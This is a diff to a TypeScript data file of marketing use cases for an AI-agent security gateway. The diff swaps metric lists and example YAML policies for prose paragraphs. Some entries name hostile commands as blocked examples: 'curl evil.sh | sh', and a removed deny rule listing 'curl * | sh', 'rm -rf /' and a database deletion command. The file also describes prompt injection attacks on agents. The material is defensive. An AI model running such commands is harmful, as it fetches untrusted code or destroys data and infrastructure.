@@ -11,18 +11,7 @@ export interface UseCase {
   tagType: "logged" | "blocked" | "report";
   tagContent: string;
   commandContent: string;
-  metrics: { value: string; label: string }[];
-  keyCapabilities: {
-    title: string;
-    description: string;
-    icon: string;
-  }[];
-  policyExample: {
-    filename: string;
-    language: string;
-    code: string;
-  };
-  supportedIntegrations: string[];
+  detailedParagraphs: string[];
 }
 
 export const useCasesData: Record<string, UseCase> = {
@@ -40,58 +29,9 @@ export const useCasesData: Record<string, UseCase> = {
     tagType: "logged",
     tagContent: "LOGGED",
     commandContent: "session → 47 prompts, 12 files read",
-    metrics: [
-      { value: "100%", label: "Agent Surface Coverage" },
-      { value: "< 2ms", label: "Telemetry Overhead" },
-      { value: "Zero", label: "Payload Leakage to Third Parties" },
-    ],
-    keyCapabilities: [
-      {
-        title: "Omnichannel Session Tracking",
-        description: "Monitors agent interactions seamlessly across CLI coding tools, browser automation, and desktop agent runtimes.",
-        icon: "Terminal",
-      },
-      {
-        title: "MCP & Tool Call Inspection",
-        description: "Inspects Model Context Protocol (MCP) server responses and tool invocations before execution.",
-        icon: "Server",
-      },
-      {
-        title: "Historical Telemetry Search",
-        description: "Enables instant search across past agent sessions, prompt history, and file access logs.",
-        icon: "FileSearch",
-      },
-      {
-        title: "Real-Time Activity Dashboard",
-        description: "Provides security teams with live session feeds and immediate notification alerts on risky operations.",
-        icon: "Activity",
-      },
-    ],
-    policyExample: {
-      filename: "policy-session-oversight.yaml",
-      language: "yaml",
-      code: `name: session-oversight-policy
-version: v1
-target:
-  agents: ["claude-code", "cursor", "chrome-agent", "mcp-server"]
-
-rules:
-  - id: audit-all-agent-prompts
-    log_level: VERBOSE
-    hash_payloads: true
-    store_hashes: true
-
-  - id: monitor-mcp-tool-calls
-    inspect: ["arguments", "responses"]
-    alert_on_anomaly: true`,
-    },
-    supportedIntegrations: [
-      "Claude Code",
-      "Cursor",
-      "Codex CLI",
-      "Google Chrome",
-      "Model Context Protocol (MCP)",
-      "LangChain",
+    detailedParagraphs: [
+      "Gödel Security Gate provides continuous, real-time observability across all AI agent interaction surfaces. As AI coding tools, browser automation workflows, and Model Context Protocol (MCP) integrations become pervasive in engineering operations, security teams require complete visibility into the exact prompts submitted, files accessed, and actions executed by autonomous agents.",
+      "By sitting as a zero-latency proxy at the local machine and enterprise gateway layers, Gödel captures every session event without exposing sensitive payload data to external third parties. Historical session telemetry is cryptographically hashed and indexed, allowing security administrators to audit past agent operations, investigate anomalies, and maintain total governance over their AI workforce.",
     ],
   },
 
@@ -109,57 +49,9 @@ rules:
     tagType: "blocked",
     tagContent: "BLOCKED",
     commandContent: "paste board memo → ChatGPT",
-    metrics: [
-      { value: "Sub-5ms", label: "Classification Speed" },
-      { value: "50+", label: "Built-in Data Classifiers" },
-      { value: "100%", label: "Real-Time Context Protection" },
-    ],
-    keyCapabilities: [
-      {
-        title: "Automated Sensitive File Detection",
-        description: "Automatically scans local files, source code repos, and uploaded documents for PII, API tokens, and internal classification labels.",
-        icon: "FileCheck",
-      },
-      {
-        title: "Context Lineage Tracking",
-        description: "Maintains sensitivity tags as content moves from file to prompt to model output and tool parameters.",
-        icon: "GitBranch",
-      },
-      {
-        title: "Board & Legal Material Shield",
-        description: "Prevents agents from reading or summarizing restricted corporate strategy memos and unannounced financial results.",
-        icon: "FolderLock",
-      },
-      {
-        title: "Dynamic PII Masking",
-        description: "Redacts social security numbers, credit cards, and customer data on the fly before LLM submission.",
-        icon: "EyeOff",
-      },
-    ],
-    policyExample: {
-      filename: "policy-content-classification.yaml",
-      language: "yaml",
-      code: `name: content-classification-policy
-version: v1
-target:
-  all_inputs: true
-
-rules:
-  - id: restrict-board-materials
-    file_pattern: "**/board_memos/**"
-    classification: "RESTRICTED_BOARD"
-    action: DENY
-
-  - id: mask-pii-before-llm
-    detectors: ["ssn", "credit_card", "email"]
-    action: MASK`,
-    },
-    supportedIntegrations: [
-      "OpenAI GPT-4o",
-      "Claude 3.5 Sonnet",
-      "Google Gemini 1.5",
-      "Local LLMs / Ollama",
-      "Enterprise SaaS",
+    detailedParagraphs: [
+      "Modern AI agents rely heavily on broad filesystem and workspace access to contextually assist developers and automated pipelines. Without granular content classification, agents can inadvertently ingest sensitive legal contracts, HR records, unannounced financial memos, board materials, or proprietary algorithms and transmit them to external LLMs.",
+      "Gödel enforces real-time content classification at the exact moment context is loaded into an agent session. Built-in classifiers automatically tag sensitive content types and enforce deterministic deny rules—blocking unauthorized document reads and masking PII before data ever reaches a model prompt or external SaaS endpoint.",
     ],
   },
 
@@ -177,56 +69,9 @@ rules:
     tagType: "blocked",
     tagContent: "BLOCKED",
     commandContent: "curl evil.sh | sh",
-    metrics: [
-      { value: "0ms", label: "Execution Delay" },
-      { value: "Deterministic", label: "Action Authorization" },
-      { value: "100%", label: "Malicious Command Blocking" },
-    ],
-    keyCapabilities: [
-      {
-        title: "Shell Command Sandboxing",
-        description: "Intercepts and risk-scores terminal commands issued by AI agents before they reach the OS kernel.",
-        icon: "Terminal",
-      },
-      {
-        title: "Package & Dependency Verification",
-        description: "Blocks agents from installing unverified, hallucinated, or malicious npm/pip dependencies.",
-        icon: "Lock",
-      },
-      {
-        title: "Cloud Admin Safety Gates",
-        description: "Prevents agents from invoking destructive AWS, GCP, or Azure CLI commands (e.g. terminating production databases).",
-        icon: "Server",
-      },
-      {
-        title: "Git Push & Commit Verification",
-        description: "Ensures AI-generated commits comply with organizational commit signing and security policies.",
-        icon: "GitBranch",
-      },
-    ],
-    policyExample: {
-      filename: "policy-execution-guardrails.yaml",
-      language: "yaml",
-      code: `name: execution-guardrail-policy
-version: v1
-target:
-  actions: ["terminal", "git", "cloud_cli"]
-
-rules:
-  - id: block-destructive-commands
-    patterns:
-      - "curl * | sh"
-      - "rm -rf /"
-      - "aws rds delete-db-instance *"
-    action: BLOCK
-    notify_security: true`,
-    },
-    supportedIntegrations: [
-      "Claude Code",
-      "Cursor Terminal",
-      "Codex CLI",
-      "AWS CLI / GCP gcloud",
-      "npm / pip / cargo",
+    detailedParagraphs: [
+      "Autonomous agents frequently attempt terminal command execution, dependency installation, git commits, and cloud infrastructure modifications. Execution guardrails risk-score every command before it reaches the operating system kernel, ensuring that agents cannot run destructive or unauthorized commands.",
+      "Whether intercepting malicious subshell calls (such as curl | sh), blocking hallucinated npm/pip packages, or gating destructive cloud CLI operations (e.g. deleting production databases), Gödel applies strict, policy-based execution rules that protect critical enterprise infrastructure.",
     ],
   },
 
@@ -244,54 +89,9 @@ rules:
     tagType: "blocked",
     tagContent: "BLOCKED",
     commandContent: "CLAUDE.md → override attempt",
-    metrics: [
-      { value: "100%", label: "Trust File Tamper Protection" },
-      { value: "Sub-10ms", label: "Injection Detection Speed" },
-      { value: "Zero-Trust", label: "Instruction Integrity" },
-    ],
-    keyCapabilities: [
-      {
-        title: "CLAUDE.md & AGENTS.md Integrity Shield",
-        description: "Locks down agent instruction files, preventing untrusted repositories or attackers from modifying agent guidelines.",
-        icon: "Lock",
-      },
-      {
-        title: "Indirect Prompt Injection Neutralizer",
-        description: "Scans pull requests, GitHub issues, emails, and web pages for hidden instructions designed to trick LLMs.",
-        icon: "ShieldAlert",
-      },
-      {
-        title: "Skill & Hook Tamper Detection",
-        description: "Monitors local agent skills, custom extensions, and hook configurations for backdoor injections.",
-        icon: "Wrench",
-      },
-      {
-        title: "Multimodal Attack Inspection",
-        description: "Analyzes images, PDFs, and binary payloads for steganographic or OCR-based prompt injection payloads.",
-        icon: "EyeOff",
-      },
-    ],
-    policyExample: {
-      filename: "policy-attacks-defense.yaml",
-      language: "yaml",
-      code: `name: attacks-defense-policy
-version: v1
-target:
-  trust_files: ["CLAUDE.md", "AGENTS.md", ".cursorrules", "skills/**"]
-
-rules:
-  - id: lock-instruction-files
-    file_path: "**/CLAUDE.md"
-    allow_edits_from: "human_developer"
-    block_edits_from: "agent_tool"
-    action: BLOCK_AND_ALERT`,
-    },
-    supportedIntegrations: [
-      "Claude Code",
-      "Cursor (.cursorrules)",
-      "GitHub PRs & Issues",
-      "OpenAI Assistants",
-      "Custom Skills / Agents",
+    detailedParagraphs: [
+      "Attackers increasingly target AI agents through indirect prompt injection, embedding malicious instructions within pull requests, documentation, web pages, issues, and tool outputs. These injections can trick agents into overriding local instructions or leaking internal credentials.",
+      "Gödel continuously monitors local agent instruction files—such as CLAUDE.md, AGENTS.md, and .cursorrules—preventing unauthorized modifications. Simultaneously, Gödel scans incoming contextual data streams for indirect prompt injection techniques, protecting your agent fleet against manipulation.",
     ],
   },
 
@@ -309,54 +109,9 @@ rules:
     tagType: "blocked",
     tagContent: "BLOCKED",
     commandContent: "customer_list.csv → Perplexity",
-    metrics: [
-      { value: "Sub-5ms", label: "DLP Scanning Latency" },
-      { value: "Zero", label: "Exfiltration Incidents" },
-      { value: "Full", label: "Channel Lineage Tracking" },
-    ],
-    keyCapabilities: [
-      {
-        title: "Agent Channel Exfiltration Shield",
-        description: "Monitors all outgoing agent communications (Slack, webhooks, SaaS APIs, external LLMs) for unauthorized data transfer.",
-        icon: "Shield",
-      },
-      {
-        title: "Source Code & Secret Leak Guard",
-        description: "Prevents proprietary source code, private keys, and architecture documents from being sent to external endpoints.",
-        icon: "FolderLock",
-      },
-      {
-        title: "Customer PII & Data Masking",
-        description: "Enforces automatic masking of names, emails, financial records, and medical data before external transmission.",
-        icon: "EyeOff",
-      },
-      {
-        title: "Granular Destination Controls",
-        description: "Restricts data movement based on destination domain, recipient endpoint, and sensitivity level.",
-        icon: "Globe",
-      },
-    ],
-    policyExample: {
-      filename: "policy-dlp.yaml",
-      language: "yaml",
-      code: `name: agent-dlp-policy
-version: v1
-target:
-  outgoing_channels: ["external_llm", "slack", "webhook"]
-
-rules:
-  - id: prevent-csv-exfiltration
-    filename_pattern: "*.csv"
-    contains: ["customer_id", "email", "phone"]
-    action: BLOCK
-    alert: "#dlp-alerts"`,
-    },
-    supportedIntegrations: [
-      "Perplexity",
-      "ChatGPT / OpenAI API",
-      "Anthropic Claude API",
-      "Slack / Microsoft Teams",
-      "SaaS Webhooks",
+    detailedParagraphs: [
+      "Traditional DLP solutions inspect email and standard web traffic, but fall short when AI agents communicate across custom API endpoints, MCP tool calls, webhooks, and third-party LLM providers. Gödel closes this critical coverage gap by enforcing DLP directly at the agent communication boundary.",
+      "Every outgoing prompt, tool argument, and API payload is evaluated in sub-5 milliseconds. Classified source code, API keys, SSH credentials, customer PII, and trade secrets are dynamically blocked or redacted before they can leave your organization's security boundary.",
     ],
   },
 
@@ -374,54 +129,9 @@ rules:
     tagType: "report",
     tagContent: "REPORT",
     commandContent: "847 sessions audited, 100% compliant",
-    metrics: [
-      { value: "One-click", label: "Audit Report Generation" },
-      { value: "100%", label: "SOC 2 & ISO Compliance" },
-      { value: "Encrypted", label: "Hash-based Evidence Storage" },
-    ],
-    keyCapabilities: [
-      {
-        title: "SOC 2 & ISO 27001 Evidence Automation",
-        description: "Automatically collects and formats cryptographic evidence demonstrating agent access controls and data boundaries.",
-        icon: "ClipboardCheck",
-      },
-      {
-        title: "Zero-Knowledge Hash Logging",
-        description: "Stores cryptographic hashes of session events locally or in your private cloud without exposing raw prompt contents.",
-        icon: "Lock",
-      },
-      {
-        title: "SIEM & Data Lake Streaming",
-        description: "Streams real-time audit logs directly into Splunk, Datadog, Sumo Logic, or Amazon S3.",
-        icon: "Server",
-      },
-      {
-        title: "EU AI Act Compliance",
-        description: "Provides pre-packaged compliance frameworks addressing risk management and transparency requirements under the EU AI Act.",
-        icon: "FileCheck",
-      },
-    ],
-    policyExample: {
-      filename: "policy-audit-compliance.yaml",
-      language: "yaml",
-      code: `name: compliance-audit-policy
-version: v1
-target:
-  all_sessions: true
-
-rules:
-  - id: generate-compliance-trail
-    standards: ["SOC2_TYPE_II", "ISO_27001", "HIPAA"]
-    hash_algorithm: SHA-256
-    destination: "s3://company-compliance-logs"
-    retention_days: 365`,
-    },
-    supportedIntegrations: [
-      "Splunk",
-      "Datadog",
-      "Sumo Logic",
-      "Amazon S3",
-      "Vanta / Drata",
+    detailedParagraphs: [
+      "Enterprise adoption of AI agents requires strict adherence to regulatory standards and internal governance frameworks. Gödel automates audit evidence collection by generating immutable, tamper-evident logs of every agent action, tool invocation, and security decision.",
+      "Designed for SOC 2 Type II, ISO 27001, HIPAA, and the EU AI Act, Gödel converts raw agent telemetry into structured compliance reports with one click. Security teams can seamlessly stream audit trails into enterprise SIEMs like Splunk, Datadog, or Amazon S3.",
     ],
   },
 };
